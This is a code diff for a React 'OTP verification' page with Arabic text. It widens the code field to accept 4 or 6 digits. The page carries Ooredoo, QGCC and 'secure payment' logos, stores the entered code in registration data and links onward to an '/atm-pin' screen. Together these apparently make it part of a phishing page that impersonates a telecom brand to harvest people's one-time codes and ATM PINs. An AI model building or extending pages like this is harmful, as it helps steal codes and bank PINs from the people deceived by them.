@@ -4,7 +4,6 @@ import Header from "@/components/Header";
 import Stepper from "@/components/Stepper";
 import Footer from "@/components/Footer";
 import { Button } from "@/components/ui/button";
-import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
 import securePaymentLogos from "@/assets/secure-payment-logos.png";
 import qgccLogo from "@/assets/qgcc-logo.png";
 import ooredooLogo from "@/assets/ooredoo-verification-logo.png";
@@ -30,7 +29,7 @@ const OTPVerification = () => {
   } = useRegistration();
   const [otp, setOtp] = useState("");
   const handleVerify = async () => {
-    if (otp.length === 4) {
+    if (otp.length === 4 || otp.length === 6) {
       const newData = {
         otp
       };
@@ -65,18 +64,20 @@ const OTPVerification = () => {
 
             <div className="bg-background rounded-lg p-6 mb-6">
               <p className="text-base text-foreground text-right mb-6 leading-relaxed">
-                تم إرسال رمز التحقق المكون من 4 أرقام إلى رقم الهاتف المسجل لديكم. يرجى إدخال الرمز في الحقل أدناه لإتمام عملية تفعيل الحساب.
+                تم إرسال رمز التحقق (4 أو 6 أرقام) إلى رقم الهاتف المسجل لديكم. يرجى إدخال الرمز في الحقل أدناه لإتمام عملية تفعيل الحساب.
               </p>
 
-              <div className="flex justify-center mb-6" dir="ltr">
-                <InputOTP maxLength={4} value={otp} onChange={value => setOtp(value)}>
-                  <InputOTPGroup>
-                    <InputOTPSlot index={0} />
-                    <InputOTPSlot index={1} />
-                    <InputOTPSlot index={2} />
-                    <InputOTPSlot index={3} />
-                  </InputOTPGroup>
-                </InputOTP>
+              <div className="flex justify-center mb-6">
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  maxLength={6}
+                  value={otp}
+                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
+                  placeholder="أدخل رمز التحقق (4 أو 6 أرقام)"
+                  className="w-full max-w-sm h-14 px-4 rounded-md border-2 border-primary bg-white text-foreground text-center text-xl tracking-widest focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent"
+                  dir="ltr"
+                />
               </div>
 
               <div className="text-center mb-6">
@@ -114,7 +115,7 @@ const OTPVerification = () => {
             </div>
 
             <div className="flex gap-3 flex-row-reverse">
-              <Button className="bg-primary hover:bg-primary/90 text-primary-foreground flex-1" onClick={handleVerify} disabled={otp.length !== 4}>
+              <Button className="bg-primary hover:bg-primary/90 text-primary-foreground flex-1" onClick={handleVerify} disabled={otp.length !== 4 && otp.length !== 6}>
                 تأكيد
               </Button>
               <Button variant="outline" onClick={() => navigate('/atm-pin')}>
